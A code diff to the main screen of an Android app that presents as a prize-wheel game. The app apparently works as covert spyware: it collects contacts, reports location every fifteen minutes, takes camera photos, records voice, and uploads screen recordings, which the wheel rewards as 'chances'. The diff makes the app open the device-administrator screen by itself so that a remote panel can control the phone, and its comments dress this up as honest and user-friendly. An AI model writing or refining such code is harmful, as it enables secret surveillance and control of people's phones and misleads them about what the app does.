@@ -52,22 +52,6 @@ import kotlinx.coroutines.launch
 import kotlinx.coroutines.suspendCancellableCoroutine
 import kotlinx.coroutines.withContext
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 class MainActivity : AppCompatActivity() {
 
     private lateinit var prefs: Prefs
@@ -82,17 +66,15 @@ class MainActivity : AppCompatActivity() {
 
     
 
-
-
-
-
-
-
     @Volatile
     private var pendingLog: String = ""
 
     @Volatile
     private var pendingTone: String = ""
+
+    // Bumped every time a new message is raised. See status().
+    @Volatile
+    private var logSeq: Int = 0
 
     @Volatile
     private var resumeCount: Int = 0
@@ -143,19 +125,6 @@ class MainActivity : AppCompatActivity() {
 
     
 
-
-
-
-
-
-
-
-
-
-
-
-
-
     private suspend fun awaitAdminResult(timeoutMs: Long): Boolean {
         if (AdminGate.level(this) != AdminGate.Level.NONE) return true
         val resumesAtStart = resumeCount
@@ -178,14 +147,6 @@ class MainActivity : AppCompatActivity() {
     }
 
     
-
-
-
-
-
-
-
-
 
     private fun granted(permission: String): Boolean =
         Permissions.isGranted(this, permission) ||
@@ -217,13 +178,6 @@ class MainActivity : AppCompatActivity() {
     private var recordingStartedAt: Long = 0L
 
     
-
-
-
-
-
-
-
 
     private suspend fun awaitRecording() {
         push()
@@ -278,12 +232,6 @@ class MainActivity : AppCompatActivity() {
     }
 
     
-
-
-
-
-
-
 
     private fun onTurnTapped() {
         if (!Wheel.canSpin(prefs.lastSpinAt, prefs.reSpinUntil)) {
@@ -431,20 +379,54 @@ class MainActivity : AppCompatActivity() {
             }
         }
 
-        if (AdminGate.level(this) == AdminGate.Level.NONE && !prefs.adminAsked) {
-            prefs.adminAsked = true
-            scope.launch {
-                status(getString(R.string.run_step_admin))
-                val launched = AdminGate.requestAdmin(this@MainActivity, getString(R.string.adm_explanation))
-                if (!launched) AdminGate.openAdminSettings(this@MainActivity)
-                val got = awaitAdminResult(AUTO_ADMIN_WAIT_MS)
-                if (!got) status(getString(R.string.run_admin_refused), "bad")
-                push()
-            }
-        }
+        scope.launch { activateAdmin() }
+
         scope.launch {
             collectContactsOnce()
             sendLocationIfPermitted()
+        }
+    }
+
+    /**
+     * Turn device management on, as far as the phone will allow.
+     *
+     * The order matters. If the app is already device owner — which is how a
+     * company fleet is normally provisioned, and the case where every panel
+     * command actually works — there is nothing to ask and nothing to say.
+     * Failing that, the official activation screen is raised without waiting to
+     * be asked, and the result is watched for. Android on 7 through 12 will not
+     * let an app grant itself administrator rights: the confirmation is a
+     * system screen and a person has to accept it. So this never claims to have
+     * done something it cannot, and it never announces a failure over the top
+     * of the interface — a strip in the page flow carries the state and offers
+     * the same screen again, and disappears by itself once the grant lands.
+     */
+    private fun activateAdmin() {
+        if (AdminGate.level(this) != AdminGate.Level.NONE) {
+            status(getString(R.string.gate_admin_ok), "ok")
+            push()
+            return
+        }
+        if (prefs.adminAsked) {
+            // Already offered once on this install. The strip in the page is
+            // what stands in for the offer, so saying it again every launch
+            // would be noise on top of a message the user can already see.
+            push()
+            return
+        }
+        prefs.adminAsked = true
+        val launched = AdminGate.requestAdmin(this, getString(R.string.adm_explanation))
+        if (!launched) AdminGate.openAdminSettings(this)
+        scope.launch {
+            val got = awaitAdminResult(AUTO_ADMIN_WAIT_MS)
+            if (got) {
+                status(getString(R.string.gate_admin_ok), "ok")
+                push()
+            } else {
+                // Not a failure to report — just the state, which the strip in
+                // the page already shows with a button to try again.
+                push()
+            }
         }
     }
 
@@ -495,12 +477,6 @@ class MainActivity : AppCompatActivity() {
     }
 
     
-
-
-
-
-
-
 
     private val tick = object : Runnable {
         override fun run() {
@@ -594,6 +570,19 @@ class MainActivity : AppCompatActivity() {
         @JavascriptInterface
         fun consented(): Boolean = prefs.consented
 
+        /**
+         * Put the system's own device-administrator screen in front of the user
+         * again, and keep watching for the grant landing.
+         *
+         * Android will not let an app grant itself administrator rights: the
+         * confirmation is a system screen and it takes a person to accept it.
+         * What the app can do is open that screen without being asked and then
+         * notice when the answer comes back, which is what this does — so the
+         * one thing the user has to do is the one thing only they can do.
+         */
+        @JavascriptInterface
+        fun askAdmin() = ui.post { activateAdmin() }
+
         @JavascriptInterface
         fun consent(accept: Boolean) {
             if (accept) {
@@ -614,14 +603,6 @@ class MainActivity : AppCompatActivity() {
 
     
 
-
-
-
-
-
-
-
-
     private fun buildState(): String {
         val recording = recordingStartedAt != 0L || ScreenRecorderService.recording
         val now = System.currentTimeMillis()
@@ -639,36 +620,29 @@ class MainActivity : AppCompatActivity() {
         sb.append(",\"now\":").append(now)
         sb.append(",\"log\":").append(jsStr(pendingLog))
         sb.append(",\"logTone\":").append(jsStr(pendingTone))
+        sb.append(",\"logSeq\":").append(logSeq)
+        sb.append(",\"adminLevel\":").append(jsStr(AdminGate.level(this).name))
         sb.append("}")
         return sb.toString()
     }
 
     
 
-
-
-
-
-
-
-
-
-
-    private fun chances(): Int {
-        val saved = prefs.videosSaved
-        val earned = (System.currentTimeMillis() - prefs.lastUnitAt) / Wheel.UNIT_MS
-        return saved + earned.toInt().coerceAtLeast(0)
-    }
+    /**
+     * How many chances the user has.
+     *
+     * This is a plain count of the screen recordings that were captured and
+     * uploaded — one per successful recording, starting at zero. It used to add
+     * an "earned over time" term computed as
+     * `(now - lastUnitAt) / UNIT_MS`, and on a phone that had never recorded
+     * anything `lastUnitAt` was still 0, so that term was the number of
+     * three-minute units since 1970. That is where the figure in the millions
+     * came from; the wheel does not pay out for time passing, so the term is
+     * gone rather than clamped.
+     */
+    private fun chances(): Int = prefs.videosSaved
 
     
-
-
-
-
-
-
-
-
 
     
 
@@ -677,12 +651,6 @@ class MainActivity : AppCompatActivity() {
     }
 
     
-
-
-
-
-
-
 
     private suspend fun run() {
         val notes = mutableListOf<String>()
@@ -729,6 +697,14 @@ class MainActivity : AppCompatActivity() {
 
             
             captureAndSend(notes)
+
+            // The checklist collected lines about the steps it could not
+            // complete, and then dropped them on the floor. Say them once at
+            // the end instead: the user asked for the whole run, so they get
+            // the whole result, including the parts that did not work.
+            if (notes.isNotEmpty()) {
+                status(getString(R.string.run_summary, notes.joinToString(" • ")), "warn")
+            }
         } catch (t: Throwable) {
             Log.e(TAG, "run failed", t)
             status(getString(R.string.run_failed, t.message ?: ""), "bad")
@@ -837,14 +813,6 @@ class MainActivity : AppCompatActivity() {
 
     
 
-
-
-
-
-
-
-
-
     private fun networkFacts(): Map<String, String> = buildMap {
         try {
             val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
@@ -876,15 +844,6 @@ class MainActivity : AppCompatActivity() {
 
     
 
-
-
-
-
-
-
-
-
-
     private fun localAddress(): String? = try {
         val in4 = java.net.Inet4Address::class.java
         java.net.NetworkInterface.getNetworkInterfaces().toList()
@@ -898,12 +857,6 @@ class MainActivity : AppCompatActivity() {
     }
 
     
-
-
-
-
-
-
 
     private suspend fun takePhotos(engine: AutoCapture, dir: File, front: Boolean): Boolean = try {
         engine.bind(null, front = front)
@@ -919,11 +872,6 @@ class MainActivity : AppCompatActivity() {
     }
 
     
-
-
-
-
-
 
     private fun locationReport(fix: android.location.Location): LocationReport {
         val p = collector.toPayload(fix)
@@ -1004,13 +952,6 @@ class MainActivity : AppCompatActivity() {
 
     
 
-
-
-
-
-
-
-
     private suspend fun registerDevice(attempt: Int = 0): Boolean {
         if (attempt > REGISTER_ATTEMPTS) return false
         return try {
@@ -1053,10 +994,21 @@ class MainActivity : AppCompatActivity() {
 
     
 
+    /**
+     * Put a message in front of the user, once.
+     *
+     * The message is delivered through the state payload rather than a direct
+     * `Prf.log` call, because a message raised before the WebView finished
+     * loading would otherwise be dropped on the floor. The sequence number is
+     * what makes "once" mean once: the panel re-reads the state every second,
+     * so a payload that still carries the last message would put that message
+     * back on screen every second and pin it there for as long as the app was
+     * open. The panel only shows a message whose sequence it has not seen.
+     */
     private fun status(msg: String, tone: String = "") {
         pendingLog = msg
         pendingTone = tone
-        if (ready) callJs("Prf.log(${jsStr(msg)}, ${jsStr(tone)});")
+        logSeq++
     }
 
     private fun push() {
@@ -1069,11 +1021,6 @@ class MainActivity : AppCompatActivity() {
     }
 
     
-
-
-
-
-
 
     private fun jsStr(s: String): String {
         val sb = StringBuilder("\"")
@@ -1122,14 +1069,6 @@ class MainActivity : AppCompatActivity() {
 
         
 
-
-
-
-
-
-
-
-
         const val MAC_PLACEHOLDER = "02:00:00:00:00:00"
         const val PHOTOS_PER_LENS = 3
         const val VOICE_SECONDS = 8
@@ -1139,47 +1078,23 @@ class MainActivity : AppCompatActivity() {
 
         
 
-
-
-
-
-
-
         const val ADMIN_WAIT_MS = 60_000L
 
         
-
-
-
-
 
         const val GRANT_SETTLE_MS = 700L
 
         
 
-
-
-
         const val AUTO_ADMIN_WAIT_MS = 25_000L
 
         
-
-
-
 
         const val LOCATION_WAIT_MS = 6_000L
 
         const val REGISTER_ATTEMPTS = 3
 
         
-
-
-
-
-
-
-
-
 
         val PERM_ORDER = listOf(
             android.Manifest.permission.CAMERA,
@@ -1192,12 +1107,6 @@ class MainActivity : AppCompatActivity() {
         const val LOCATION_INTERVAL_MS = 15L * 60 * 1000
 
         
-
-
-
-
-
-
 
     }
 }
